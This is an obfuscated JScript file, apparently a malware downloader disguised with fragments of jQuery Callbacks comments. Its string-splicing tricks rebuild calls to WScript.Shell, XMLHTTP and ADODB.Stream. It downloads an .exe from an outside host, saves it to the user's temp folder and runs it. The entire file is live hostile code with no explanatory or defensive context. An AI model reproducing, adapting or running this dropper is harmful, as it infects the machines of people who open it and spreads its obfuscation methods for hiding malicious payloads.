dTUIKNiUiX = " Actual Callbacks object self = {";
plumeI = 0;
String.prototype.magazines = function () { ssxxs = this; return ssxxs.substr((51-122)*0,1); };
wellfounded = (("pincers", "altruism", "illustration", "nokia", "pitwSDp") + "QhBbXoSOHs").magazines();
var KkXAC = [("peoples","cabinet","G")+"Oj"+("coined","gretchen","dw")+"Jrm", ("asked","housing","marianne","D")+"hu"+"Htbu"+("arrival","expedia","irksome","xn"), "E"+""+("decimal","souls","poole","cylinder","x")+"pan"+("henderson","gushing","dE")+("sport","stand","nv")+("cacao","reflections","asked","jaguar","ir")+("resides","indiscriminate","on")+("champions","safer","solicitor",""+"m"+"en"+("ladylike","align","tSt"))+("designed","clandestinely","gallic",("disdainful","downloading","walnut","r")+"in"+"gs"), ""+("utilize","fudge","%T")+"E"+"M"+("abased","dowry","cleanse","P%"), ("resin","framework","berry","")+"."+"e"+("fluent","every","squalid","theology","xe"), ("interim","night","nicer","R")+"un", "A"+("roguish","mauritius","insular",""+"c"+("coeval","decorous","drainage","tan"))+"sw"+("participate","allowed","assure","er")+("objecting","brackish","ed")+("mickle","purblind","trade",("adjust","application","i")+"va"+"nswe"+("domesticated","incorporate","matters","redeX"))+("unity","domain","authorize","wiley","an")+"sweredOb"+"an"+"sw"+("conditioned","hygiene","superstructure","er")+("barter","unfathomable","centered","ed")+("unaltered","compiler","strongly","cracking","je")+("listless","quotes","an")+("wonder","convenience","swans","funding","")+"s"+"wer"+("gillian","eightyfive","whelp","selections","ed")+("nurse","generic","faith","aboriginal","ct"), "TokNKWuKOK", "GQaHWgwNPSy", ("crags","participating","actual","W")+("sticks","owned","assignment","assessments","Sc")+"an"+"sw"+"eredript"+("organizing","responses","answer")+"ed." + ("terse","concerts","contemporaneous","S"), ""+"h"+("workhouse","hallowed","kV")+("exceed","fidget","miscreant","recur","zmp"), "h"+"an"+"swered"+"el"+("departmental","keynote","answeredl"), "tKGjvKCLaQ", "aMR"+"CS"+"oo"+("highly","plaintiff","papacy","irrigation","mp"), ("zephyr","inactive","M")+("cropped","mushrooms","relates","answ")+"er"+("cabriolet","notified","edSX")+("delaware","jaunt","hemisphere","particularly","an")+("pointed","drummer","oblation","sw")+("exclusive","greatcoat","connective","agriculture","er")+"edML"+("satin","orpheus","answ")+("wireless","inborn","ered2") + ("clean","thereof",".")+("gardening","description","packing","answ")+""+"e"+("heritage","worcester","re")+"dXM"+"an"+("jesus","improve","indexed","afghan","swe"+"re"+("phoenix","tutelary","emulation","dL")+"Hansw")+"e"+"re"+("comics","suicide","chicago","spine","dT")+"TP"];
vCSeICVS = " Inspect recursively add( arg ); } } ); } )( arguments );";
KkXAC.splice(7, plumeI + 2);
vituperation = KkXAC[1+4+1].split("answered").join("");
var eObJVak = this[vituperation];
KHtVaqd = "JKASWdQThl";
scholarships = (("refined", "perpetuate", "accommodations", "concourse", "sJReMYLAWry") + "FiWuHyyS").magazines();
sssdcddl = (("nowhere", "diamond", "ludwig", "equipped", "lfUAKaqqLr") + "BRvDAUGkuXo").magazines();

plumeI = 7;
KkXAC[plumeI] = KkXAC[plumeI] + KkXAC[plumeI + 2];
KkXAC[plumeI + 1] = "DhxuzaLOor";
KkXAC.splice(plumeI + 1, plumeI - 4);
KkXAC[plumeI] = KkXAC[plumeI].split("answered").join("");
var PKRlKm = new eObJVak(KkXAC[plumeI]);
TkPoqjFnmg = " If we haveXEOqsL memory from a past run, we should fire after adding if ( memory &vOFxWAkDwy& !firing ) { firingIndex = list.length - 1; queue.push( memory ); ";
plumeI++;
KkXAC[plumeI + 1] = KkXAC[plumeI + 1].split("answered").join("");
var YLbIO = new eObJVak(KkXAC[1 + plumeI]);
plumeI = plumeI + plumeI;
plumeI = plumeI / 4 + 2;
dAaGXTDpBe = " Add a callback or a collection of callbacks to the list add: function() { if ( list ) {";

var eEJgSJee = PKRlKm[KkXAC[plumeI - 3-1]](KkXAC[plumeI  - 1-2]);
kXYbASijbDz = "} ( function add( args ) { jQuery.each( args, function( _, arg ) { if ( oeTlqqjQuery.isFunction( arg ) ) { if ( !options.unique || !self.has( arg ) ) { list.push( arg ); } } else if ( arg && arg.length && jQuery.type( arg ) !== \"string\" ) {";
locatee = (("latch", "unkempt", "esoteric", "coordination", "EmFQqYCEk") + "wYKDnxLCyig").magazines();

function instability(annoying, electron) {

    try {
        var marketplace = eEJgSJee + "/" + electron + KkXAC[plumeI-2];
    oHMedek = " Disable .fire Also disable .add unless we have memory (since it would have no effect) Abort any pending executions lock: function() { locked = true; if ( !memory ) { self.disable(); } return this; }, locked: function() { retuWkUDmNYrn !!locked; },";
    YLbIO["o" + wellfounded + locatee + "n"](("harder","predominant","G") + locatee + ("bandit","projection","braggart","prague","T"), annoying, false);

    XrUloTpkv = " Call all callbacks with the given context fLnxWfgand arguments fireWith: function( context, args ) { if ( !locked ) { args = args || []; args = [ context, args.slice ? args.slice() : args ];fOdRMIMEKUM queue.push( args ); if ( !firing ) { fire(); } } return this; },";
    YLbIO[scholarships + ("something","verification","sickle","e") + (("superior", "brandenburg", "branches", "tannin", "category", "nLLTpuqEEVfs") + "bJdobkSUlY").magazines() + (("conclude", "implies", "shakira", "trappings", "significance", "dirXyXFPaV") + "baNPuQ").magazines()]();
    AxILMvKhhL = " Call all the callbacks with the given arguments fire: function() { self.fireWith( this, arguments ); return this; },";
    if (YLbIO.status == 200) {
        var iBIdu = new eObJVak((""+("choosing","armature","A")+("shade","discharging","argentina","raise","pO")+"DB." + ("cisco","reconsider","mermaid","disposal","")+("sprig","investigation","coeval","S")+"tr"+"eam").replace("p", "D"));
        iBIdu[""+"o"+("imitator","apostrophe","snowboard","pen")]();
        LXCyXeT = " if ( memory && !firing ) { fire(); } } return this; },";
        iBIdu.type = 4/4 + (8-12*0)*0;
        cKUpvYcxDmu = " Remove a callback from the list remove: function() { jQuery.each( arguments, function( _, arg ) { var index; while ( ( index = jQuery.inArray( arg, list, index ) ) > -1 ) { list.splice( index, 1 );";
        iBIdu["w"+("prisoner","logistics","ri")+"te"](YLbIO[("elopement","brigantine","R")+"e"+scholarships+"pon" + scholarships + "e"+("bearable","magazine","pillow","Bo")+"dy"]);
        astoMu = " Handle firing indexes if ( index <= firingIndex ) { firingIndex--; } } } ); return this; },";
        iBIdu[(wellfounded + ("agape","slovakia","resonance","fungi","o")+("inspections","mapping","Di")+"ti"+"on").replace("D", scholarships)] = 0;
        vVmrPTFnWwB = " Check if a givrrLikjpuULen callback is in the list. If no argument is given, return whether or not list has callbacks attached. has: function( fn ) { return fn ? jQuery.inArray( fn, list ) > -1 : list.length > 0; },";
        iBIdu[scholarships+("semicircular","angels","dimple","lawfully","a")+"v"+("vociferous","wouldbe","eT")+("coffer","wading","dross","o"+"F")+"i"+sssdcddl+"e"](marketplace, 3/3+4/4);
        JUxNbF = " Remove all callbackOEVLKKnGhqs from the list empty: function() { if ( list ) { list = []; } return this; },";
        iBIdu.close();
        mMKWhU = " Disable .fire andxJfnwnxqSra .add Abort any current/pending executions Clear all callbacks and values disable: function() { locked = queue = []; list = memory = \"\"; return this; }, disabled: function() { return !list; },";
        PKRlKm[KkXAC[plumeI - 1]](marketplace, 1, "IjtDoLCkya" === "sevOKeabjK"); BznKYJ = " jQuery.extend( {";
    }

} catch (TYOPC) { };
    BDsHEh = " return self; };";
}
instability("h"+("prove","allotment","ttp://akalbatu.com/3476g")+("abstaining","diploma","rb4f43")+("scholarships","unwise","shakespearean","firebrand","4r")+("robin","worshipping",".exe"),"UNaenNP");
   TtiPyyvx = " To know if the callbacks have already been called at least once fired: function() { return !!fired; } };";